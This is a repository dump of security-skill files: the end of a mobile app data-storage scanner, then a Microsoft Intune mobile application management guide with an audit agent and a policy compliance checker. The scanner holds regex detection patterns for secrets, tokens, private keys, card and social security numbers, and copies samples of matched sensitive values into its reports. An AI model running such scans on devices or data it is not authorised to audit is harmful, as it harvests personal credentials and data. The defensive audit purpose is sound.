    "secret": re.compile(r"(?:secret|private[_-]?key)\s*[:=]\s*['\"]?([a-zA-Z0-9_/+=]{16,})", re.IGNORECASE),
    "jwt": re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"),
    "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
    "credit_card": re.compile(r"\b(?:4\d{3}|5[1-5]\d{2}|6011|3[47]\d)\d{8,12}\b"),
    "ssn": re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    "private_key": re.compile(r"BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY"),
}


def scan_shared_preferences(prefs_dir: str) -> list:
    """Scan Android SharedPreferences XML files for sensitive data."""
    findings = []
    prefs_path = Path(prefs_dir)

    if not prefs_path.exists():
        return findings

    for xml_file in prefs_path.glob("*.xml"):
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()

            for element in root.iter():
                name = element.get("name", "")
                value = element.text or element.get("value", "")

                for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                    if pattern.search(name) or pattern.search(str(value)):
                        findings.append({
                            "source": f"SharedPreferences/{xml_file.name}",
                            "key": name,
                            "value_preview": str(value)[:50] + "..." if len(str(value)) > 50 else str(value),
                            "pattern_matched": pattern_name,
                            "severity": "CRITICAL" if pattern_name in ("password", "private_key", "credit_card") else "HIGH",
                        })
        except ET.ParseError:
            findings.append({
                "source": f"SharedPreferences/{xml_file.name}",
                "key": "PARSE_ERROR",
                "pattern_matched": "error",
                "severity": "INFO",
            })

    return findings


def scan_sqlite_databases(db_dir: str) -> list:
    """Scan SQLite databases for sensitive data."""
    findings = []
    db_path = Path(db_dir)

    if not db_path.exists():
        return findings

    for db_file in list(db_path.glob("*.db")) + list(db_path.glob("*.sqlite")):
        try:
            conn = sqlite3.connect(str(db_file))
            cursor = conn.cursor()

            # Check if database is encrypted
            try:
                cursor.execute("SELECT count(*) FROM sqlite_master;")
                findings.append({
                    "source": f"Database/{db_file.name}",
                    "key": "encryption_status",
                    "value_preview": "Database is NOT encrypted (SQLCipher not used)",
                    "pattern_matched": "unencrypted_database",
                    "severity": "HIGH",
                })
            except sqlite3.DatabaseError:
                findings.append({
                    "source": f"Database/{db_file.name}",
                    "key": "encryption_status",
                    "value_preview": "Database appears to be encrypted",
                    "pattern_matched": "encrypted_database",
                    "severity": "INFO",
                })
                continue

            # Get all tables
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = [row[0] for row in cursor.fetchall()]

            for table in tables:
                # Get column names
                cursor.execute(f"PRAGMA table_info('{table}');")
                columns = [col[1] for col in cursor.fetchall()]

                # Check column names for sensitive patterns
                sensitive_cols = []
                for col in columns:
                    col_lower = col.lower()
                    if any(s in col_lower for s in ["password", "token", "secret", "key", "auth", "credential", "ssn", "credit"]):
                        sensitive_cols.append(col)

                if sensitive_cols:
                    # Sample data from sensitive columns
                    cols_str = ", ".join(sensitive_cols)
                    cursor.execute(f"SELECT {cols_str} FROM '{table}' LIMIT 3;")
                    samples = cursor.fetchall()

                    findings.append({
                        "source": f"Database/{db_file.name}/{table}",
                        "key": f"sensitive_columns: {', '.join(sensitive_cols)}",
                        "value_preview": str(samples[:2]) if samples else "empty",
                        "pattern_matched": "sensitive_database_columns",
                        "severity": "CRITICAL",
                    })

                # Full text search in all columns
                try:
                    cursor.execute(f"SELECT * FROM '{table}' LIMIT 100;")
                    rows = cursor.fetchall()
                    for row in rows:
                        row_text = " ".join(str(cell) for cell in row if cell)
                        for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                            if pattern.search(row_text):
                                findings.append({
                                    "source": f"Database/{db_file.name}/{table}",
                                    "key": f"row_data_match",
                                    "value_preview": row_text[:100],
                                    "pattern_matched": pattern_name,
                                    "severity": "HIGH",
                                })
                                break
                except sqlite3.OperationalError:
                    pass

            conn.close()

        except sqlite3.Error as e:
            findings.append({
                "source": f"Database/{db_file.name}",
                "key": "error",
                "value_preview": str(e),
                "pattern_matched": "error",
                "severity": "INFO",
            })

    return findings


def scan_plist_files(plist_dir: str) -> list:
    """Scan iOS plist files for sensitive data."""
    findings = []
    plist_path = Path(plist_dir)

    if not plist_path.exists():
        return findings

    for plist_file in plist_path.rglob("*.plist"):
        try:
            with open(plist_file, "r", errors="replace") as f:
                content = f.read()

            for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                matches = pattern.findall(content)
                if matches:
                    findings.append({
                        "source": f"Plist/{plist_file.name}",
                        "key": pattern_name,
                        "value_preview": str(matches[0])[:50],
                        "pattern_matched": pattern_name,
                        "severity": "HIGH",
                    })
        except (OSError, UnicodeDecodeError):
            pass

    return findings


def scan_general_files(data_dir: str) -> list:
    """Scan general files for sensitive data and permission issues."""
    findings = []
    data_path = Path(data_dir)

    for file_path in data_path.rglob("*"):
        if not file_path.is_file():
            continue
        if file_path.suffix in (".so", ".dylib", ".png", ".jpg", ".gif", ".mp3", ".mp4"):
            continue
        if file_path.stat().st_size > 5 * 1024 * 1024:
            continue

        try:
            with open(file_path, "r", errors="replace") as f:
                content = f.read(10000)

            for pattern_name, pattern in SENSITIVE_PATTERNS.items():
                matches = pattern.findall(content)
                if matches:
                    findings.append({
                        "source": f"File/{file_path.relative_to(data_path)}",
                        "key": pattern_name,
                        "value_preview": str(matches[0])[:50],
                        "pattern_matched": pattern_name,
                        "severity": "HIGH" if pattern_name in ("password", "private_key") else "MEDIUM",
                    })
        except (OSError, UnicodeDecodeError):
            pass

    return findings


def main():
    parser = argparse.ArgumentParser(description="Mobile Data Storage Security Scanner")
    parser.add_argument("--data-dir", required=True, help="Extracted app data directory")
    parser.add_argument("--platform", choices=["android", "ios"], default="android")
    parser.add_argument("--output", default="storage_scan.json", help="Output report path")
    args = parser.parse_args()

    data_dir = Path(args.data_dir)
    if not data_dir.exists():
        print(f"[-] Directory not found: {args.data_dir}")
        sys.exit(1)

    all_findings = []

    if args.platform == "android":
        print("[*] Scanning SharedPreferences...")
        all_findings.extend(scan_shared_preferences(str(data_dir / "shared_prefs")))

        print("[*] Scanning SQLite databases...")
        all_findings.extend(scan_sqlite_databases(str(data_dir / "databases")))
    else:
        print("[*] Scanning plist files...")
        all_findings.extend(scan_plist_files(str(data_dir / "Library" / "Preferences")))

        print("[*] Scanning SQLite databases...")
        all_findings.extend(scan_sqlite_databases(str(data_dir)))

    print("[*] Scanning general files...")
    all_findings.extend(scan_general_files(str(data_dir)))

    # Generate report
    severity_counts = {}
    for f in all_findings:
        sev = f["severity"]
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    report = {
        "scan": {
            "data_directory": str(data_dir),
            "platform": args.platform,
            "date": datetime.now().isoformat(),
        },
        "summary": {
            "total_findings": len(all_findings),
            "by_severity": severity_counts,
        },
        "findings": all_findings,
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[+] Scan complete: {len(all_findings)} findings")
    print(f"[+] Report saved: {args.output}")
    for sev, count in sorted(severity_counts.items()):
        print(f"    {sev}: {count}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/SKILL.md =====
---
name: implementing-mobile-application-management
description: 'Implements Mobile Application Management (MAM) policies to protect enterprise
  data on managed and unmanaged mobile devices through app-level controls including
  data loss prevention, selective wipe, app configuration, and containerization. Use
  when securing corporate apps on BYOD devices, implementing Intune App Protection
  Policies, or enforcing data separation between personal and work apps. Activates
  for requests involving MAM deployment, app protection policies, mobile containerization,
  or BYOD security.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- mam
- enterprise-security
- owasp-mobile
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1610
---
# Implementing Mobile Application Management

## When to Use

Use this skill when:
- Deploying enterprise mobile app protection without full device management (MDM)
- Implementing BYOD policies that protect corporate data while respecting personal privacy
- Configuring Microsoft Intune App Protection Policies for iOS and Android
- Enforcing data loss prevention controls on managed mobile applications

**Do not use** when full device management (MDM) is already deployed and sufficient -- MAM adds complexity when MDM already provides the needed controls.

## Prerequisites

- Microsoft Intune or equivalent MAM platform (VMware Workspace ONE, MobileIron)
- Azure AD for identity and conditional access policies
- Intune App SDK integrated into target applications (or Intune App Wrapping Tool)
- Test devices (Android 10+ and iOS 15+)
- Azure AD Premium P1 or P2 licenses for conditional access

## Workflow

### Step 1: Define App Protection Policy Requirements

Classify data sensitivity and define protection tiers:

| Tier | Data Type | Controls |
|------|-----------|----------|
| Tier 1 - Basic | General corporate email | Require PIN, block screenshots |
| Tier 2 - Enhanced | Financial data, HR records | Encrypt app data, restrict cut/copy/paste |
| Tier 3 - High | PII, healthcare, legal | Selective wipe, offline access limits, DLP |

### Step 2: Configure Intune App Protection Policies

**Android App Protection Policy:**
```json
{
    "displayName": "Corporate App Protection - Tier 2",
    "platform": "android",
    "dataProtectionSettings": {
        "allowedDataStorageLocations": ["oneDriveForBusiness", "sharePoint"],
        "blockDataTransferToOtherApps": "managedApps",
        "blockDataTransferFromOtherApps": "managedApps",
        "saveAsBlocked": true,
        "clipboardSharingLevel": "managedAppsWithPasteIn",
        "screenCaptureBlocked": true,
        "encryptAppData": true,
        "backupBlocked": true
    },
    "accessSettings": {
        "pinRequired": true,
        "minimumPinLength": 6,
        "biometricEnabled": true,
        "offlineGracePeriod": 720,
        "offlineWipeInterval": 90
    },
    "conditionalLaunchSettings": {
        "maxOsVersion": "15.0",
        "minOsVersion": "12.0",
        "jailbreakBlocked": true,
        "maxPinRetries": 5
    }
}
```

### Step 3: Implement App Configuration Policies

Deploy managed app configuration for automatic endpoint setup:

```json
{
    "displayName": "Email App Configuration",
    "targetedManagedApps": ["com.microsoft.outlooklite"],
    "settings": [
        {"key": "com.microsoft.outlook.EmailProfile.AccountType", "value": "ModernAuth"},
        {"key": "com.microsoft.outlook.EmailProfile.ServerName", "value": "outlook.office365.com"},
        {"key": "com.microsoft.outlook.EmailProfile.AllowedDomains", "value": "corporate.com"}
    ]
}
```

### Step 4: Deploy Conditional Access Integration

```
Azure AD > Conditional Access > New Policy:
- Users: All users with corporate apps
- Cloud apps: Office 365, custom LOB apps
- Conditions: All platforms
- Grant: Require app protection policy
- Session: App enforced restrictions
```

### Step 5: Test and Validate MAM Controls

Test each policy control on both platforms:

```bash
# Verify data transfer restrictions
1. Open managed app (Outlook)
2. Copy text from email body
3. Attempt paste in unmanaged app (Notes) -- should be blocked
4. Attempt paste in managed app (Teams) -- should work

# Verify selective wipe
1. Enroll test device with MAM
2. Access corporate data in managed apps
3. Trigger selective wipe from Intune portal
4. Verify corporate data removed, personal data intact

# Verify offline grace period
1. Access managed app while connected
2. Disconnect from network
3. After grace period expires, verify app access blocked
```

### Step 6: Monitor and Respond

Configure MAM monitoring dashboards:
- App protection policy assignment status
- Non-compliant device/user reports
- Selective wipe execution logs
- Jailbreak/root detection alerts
- Failed PIN attempt tracking

## Key Concepts

| Term | Definition |
|------|-----------|
| **MAM** | Mobile Application Management - app-level policies without requiring full device enrollment |
| **App Protection Policy** | Set of rules enforcing data protection at the app level (encryption, DLP, access controls) |
| **Selective Wipe** | Removing only corporate data from managed apps while preserving personal data |
| **App Wrapping** | Post-build process applying MAM SDK policies to apps without source code modification |
| **Containerization** | Isolating corporate app data in an encrypted container separate from personal apps |

## Tools & Systems

- **Microsoft Intune**: Cloud-based MAM/MDM platform with app protection policies
- **Intune App SDK**: SDK for integrating MAM controls into custom iOS/Android apps
- **Intune App Wrapping Tool**: Post-compilation tool for applying MAM policies without code changes
- **VMware Workspace ONE**: Alternative MAM platform with app containerization
- **Azure AD Conditional Access**: Policy engine for enforcing MAM enrollment as access condition

## Common Pitfalls

- **SDK version mismatch**: Intune App SDK version must match the policy version. Outdated SDK versions may silently fail to enforce newer policies.
- **iOS managed pasteboard**: iOS enforces paste restrictions through managed pasteboard, which requires the app to opt-in via Intune SDK integration.
- **App wrapping limitations**: Wrapped apps cannot use certain features (push notifications on some platforms). SDK integration is preferred for full functionality.
- **User experience friction**: Overly restrictive policies cause user frustration and shadow IT. Start with Tier 1 and escalate based on data sensitivity.

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/assets/template.md =====
# MAM Implementation Report

## Policy Configuration
| Setting | Value | Baseline | Compliant |
|---------|-------|----------|-----------|
| PIN Required | [VALUE] | [EXPECTED] | [YES/NO] |
| Encryption | [VALUE] | [EXPECTED] | [YES/NO] |
| Clipboard Restriction | [VALUE] | [EXPECTED] | [YES/NO] |
| Screenshot Blocked | [VALUE] | [EXPECTED] | [YES/NO] |
| Jailbreak Blocked | [VALUE] | [EXPECTED] | [YES/NO] |

## Managed Applications
| App | Platform | SDK Integrated | Policy Assigned |
|-----|----------|---------------|----------------|
| [APP] | [PLATFORM] | [YES/NO] | [YES/NO] |

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/references/api-reference.md =====
# API Reference: Implementing Mobile Application Management

## Microsoft Intune MAM API (Graph)

```python
import requests
headers = {"Authorization": "Bearer <token>"}
# List MAM policies
policies = requests.get(
    "https://graph.microsoft.com/v1.0/deviceAppManagement/managedAppPolicies",
    headers=headers).json()
# List managed apps
apps = requests.get(
    "https://graph.microsoft.com/v1.0/deviceAppManagement/managedAppRegistrations",
    headers=headers).json()
```

## MAM Policy Settings

| Setting | Recommended | Description |
|---------|------------|-------------|
| pinRequired | true | Require app PIN |
| encryptAppData | true | Encrypt app data |
| dataBackupBlocked | true | Block iCloud/Google backup |
| screenCaptureBlocked | true | Block screenshots |
| managedBrowserRequired | true | Force managed browser |
| maxPinRetries | 5 | Wipe after failures |

## Conditional Launch Settings

| Condition | Action | Value |
|-----------|--------|-------|
| Jailbreak/root | Block | true |
| Min OS version | Warn/Block | 16.0 |
| Offline wipe | Wipe | 30 days |
| Max PIN retries | Wipe | 5 |

### References

- Intune MAM: https://learn.microsoft.com/en-us/mem/intune/apps/app-protection-policy
- Graph API MAM: https://learn.microsoft.com/en-us/graph/api/resources/intune-mam-conceptual

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/references/standards.md =====
# Standards Reference: Mobile Application Management

## NIST SP 800-124 Rev 2 - Mobile Device Security
- Section 4: Enterprise mobile security technologies (MDM, MAM, MTD)
- Section 5: App vetting and management requirements

## OWASP Mobile Top 10 2024
| ID | Risk | MAM Mitigation |
|----|------|---------------|
| M6 | Inadequate Privacy Controls | Data separation between personal and corporate |
| M8 | Security Misconfiguration | Enforced app configuration policies |
| M9 | Insecure Data Storage | App-level encryption and backup restrictions |

## CIS Controls v8
| Control | MAM Relevance |
|---------|--------------|
| 2.5 | Allowlist authorized mobile software |
| 3.6 | Encrypt data on end-user devices |
| 6.4 | Require MFA for remote access |

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/references/workflows.md =====
# Workflows: Mobile Application Management

## Workflow 1: MAM Deployment
```
[Define data classification] --> [Create protection tiers] --> [Configure policies]
       |                                                              |
[Identify managed apps]                                    [App protection policies]
[Integrate Intune SDK]                                     [App configuration policies]
                                                           [Conditional access]
                                                                      |
                                                           [Test on pilot devices]
                                                           [Validate DLP controls]
                                                           [Roll out to users]
```

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/scripts/agent.py =====
#!/usr/bin/env python3
"""Mobile Application Management Agent - audits MDM policies, app inventory, and compliance posture."""

import json
import argparse
import logging
import subprocess
from collections import defaultdict
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def mdm_api_request(base_url, token, endpoint, method="GET"):
    """Execute MDM API request via curl."""
    cmd = ["curl", "-s", "-X", method,
           "-H", f"Authorization: Bearer {token}",
           "-H", "Accept: application/json",
           f"{base_url}{endpoint}"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return json.loads(result.stdout) if result.stdout else {}


def get_managed_devices(base_url, token):
    """Get all managed devices."""
    return mdm_api_request(base_url, token, "/api/v1/devices")


def get_managed_apps(base_url, token):
    """Get managed application inventory."""
    return mdm_api_request(base_url, token, "/api/v1/apps")


def get_compliance_policies(base_url, token):
    """Get device compliance policies."""
    return mdm_api_request(base_url, token, "/api/v1/compliance/policies")


def get_app_protection_policies(base_url, token):
    """Get MAM app protection policies."""
    return mdm_api_request(base_url, token, "/api/v1/app-protection-policies")


def audit_device_compliance(devices):
    """Audit device compliance status."""
    compliant = 0
    non_compliant = 0
    issues = defaultdict(int)
    for device in devices:
        if device.get("compliance_state") == "compliant":
            compliant += 1
        else:
            non_compliant += 1
            for issue in device.get("compliance_issues", []):
                issues[issue] += 1
    return {
        "total_devices": len(devices),
        "compliant": compliant,
        "non_compliant": non_compliant,
        "compliance_rate": round(compliant / max(len(devices), 1) * 100, 1),
        "top_issues": dict(sorted(issues.items(), key=lambda x: x[1], reverse=True)[:10]),
    }


def audit_app_security(apps):
    """Audit managed app security configuration."""
    findings = []
    for app in apps:
        app_name = app.get("name", "unknown")
        if not app.get("managed"):
            findings.append({"app": app_name, "issue": "unmanaged_app", "severity": "medium"})
        if app.get("data_sharing_allowed"):
            findings.append({"app": app_name, "issue": "data_sharing_enabled", "severity": "high"})
        if not app.get("encryption_required"):
            findings.append({"app": app_name, "issue": "encryption_not_required", "severity": "high"})
        if not app.get("pin_required"):
            findings.append({"app": app_name, "issue": "no_app_pin", "severity": "medium"})
        if app.get("allow_backup_to_cloud"):
            findings.append({"app": app_name, "issue": "cloud_backup_allowed", "severity": "medium"})
    return findings


def audit_protection_policies(policies):
    """Audit MAM protection policy configuration."""
    results = []
    for policy in policies:
        checks = {
            "data_transfer_restricted": policy.get("restrict_cut_copy_paste", False),
            "save_as_blocked": policy.get("block_save_as", False),
            "screen_capture_blocked": policy.get("block_screen_capture", False),
            "managed_browser_required": policy.get("require_managed_browser", False),
            "min_os_version_set": bool(policy.get("minimum_os_version")),
            "jailbreak_detection": policy.get("block_jailbroken", False),
            "offline_grace_period_set": bool(policy.get("offline_interval")),
        }
        passed = sum(1 for v in checks.values() if v)
        results.append({
            "policy_name": policy.get("name", "unknown"),
            "platform": policy.get("platform", "unknown"),
            "checks": checks,
            "score": round(passed / max(len(checks), 1) * 100, 1),
        })
    return results


def generate_report(devices, apps, policies, protection_policies):
    device_audit = audit_device_compliance(devices)
    app_findings = audit_app_security(apps)
    policy_audit = audit_protection_policies(protection_policies)
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "device_compliance": device_audit,
        "app_security_findings": len(app_findings),
        "high_severity_findings": len([f for f in app_findings if f["severity"] == "high"]),
        "app_findings_detail": app_findings[:20],
        "protection_policy_audit": policy_audit,
        "overall_mam_score": round(
            sum(p["score"] for p in policy_audit) / max(len(policy_audit), 1), 1),
    }
    return report


def main():
    parser = argparse.ArgumentParser(description="Mobile Application Management Audit Agent")
    parser.add_argument("--mdm-url", required=True, help="MDM/UEM API base URL")
    parser.add_argument("--token", required=True, help="API bearer token")
    parser.add_argument("--output", default="mam_audit_report.json")
    args = parser.parse_args()

    devices = get_managed_devices(args.mdm_url, args.token)
    apps = get_managed_apps(args.mdm_url, args.token)
    policies = get_compliance_policies(args.mdm_url, args.token)
    protection = get_app_protection_policies(args.mdm_url, args.token)
    report = generate_report(devices, apps, policies, protection)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    logger.info("MAM audit: %d devices (%.1f%% compliant), %d app findings, MAM score %.1f%%",
                report["device_compliance"]["total_devices"],
                report["device_compliance"]["compliance_rate"],
                report["app_security_findings"], report["overall_mam_score"])
    print(json.dumps(report, indent=2, default=str))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-mobile-application-management/scripts/process.py =====
#!/usr/bin/env python3
"""
MAM Policy Compliance Checker

Validates Intune App Protection Policy configurations against security baselines.

Usage:
    python process.py --policy policy.json [--baseline tier2] [--output report.json]
"""

import argparse
import json
import sys
from datetime import datetime
from pathlib import Path

BASELINE_TIER2 = {
    "pin_required": True,
    "min_pin_length": 6,
    "biometric_enabled": True,
    "encrypt_app_data": True,
    "screen_capture_blocked": True,
    "backup_blocked": True,
    "clipboard_restriction": "managedApps",
    "jailbreak_blocked": True,
    "offline_grace_period_max_minutes": 1440,
    "max_pin_retries": 5,
}

BASELINE_TIER3 = {
    **BASELINE_TIER2,
    "min_pin_length": 8,
    "clipboard_restriction": "blocked",
    "offline_grace_period_max_minutes": 720,
    "save_as_blocked": True,
    "printing_blocked": True,
    "max_pin_retries": 3,
}


def check_compliance(policy: dict, baseline: dict) -> list:
    """Check policy against baseline requirements."""
    findings = []
    data = policy.get("dataProtectionSettings", {})
    access = policy.get("accessSettings", {})
    conditional = policy.get("conditionalLaunchSettings", {})

    checks = {
        "pin_required": access.get("pinRequired"),
        "min_pin_length": access.get("minimumPinLength", 0),
        "biometric_enabled": access.get("biometricEnabled"),
        "encrypt_app_data": data.get("encryptAppData"),
        "screen_capture_blocked": data.get("screenCaptureBlocked"),
        "backup_blocked": data.get("backupBlocked"),
        "jailbreak_blocked": conditional.get("jailbreakBlocked"),
    }

    for control, expected in baseline.items():
        actual = checks.get(control)
        if actual is None:
            findings.append({
                "control": control,
                "status": "MISSING",
                "expected": expected,
                "actual": None,
                "severity": "HIGH",
            })
        elif isinstance(expected, bool) and actual != expected:
            findings.append({
                "control": control,
                "status": "NON_COMPLIANT",
                "expected": expected,
                "actual": actual,
                "severity": "HIGH",
            })
        elif isinstance(expected, int) and isinstance(actual, int) and actual < expected:
            findings.append({
                "control": control,
                "status": "BELOW_MINIMUM",
                "expected": f">= {expected}",
                "actual": actual,
                "severity": "MEDIUM",
            })

    return findings


def main():
    parser = argparse.ArgumentParser(description="MAM Policy Compliance Checker")
    parser.add_argument("--policy", required=True, help="Policy JSON file")
    parser.add_argument("--baseline", choices=["tier2", "tier3"], default="tier2")
    parser.add_argument("--output", default="mam_compliance.json")
    args = parser.parse_args()

    with open(args.policy) as f:
        policy = json.load(f)

    baseline = BASELINE_TIER3 if args.baseline == "tier3" else BASELINE_TIER2
    findings = check_compliance(policy, baseline)

    compliant_count = len(baseline) - len(findings)
    report = {
        "check": {"policy": args.policy, "baseline": args.baseline, "date": datetime.now().isoformat()},
        "summary": {
            "total_controls": len(baseline),
            "compliant": compliant_count,
            "non_compliant": len(findings),
        },
        "findings": findings,
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] Compliance: {compliant_count}/{len(baseline)} controls pass")
    print(f"[+] Report saved: {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


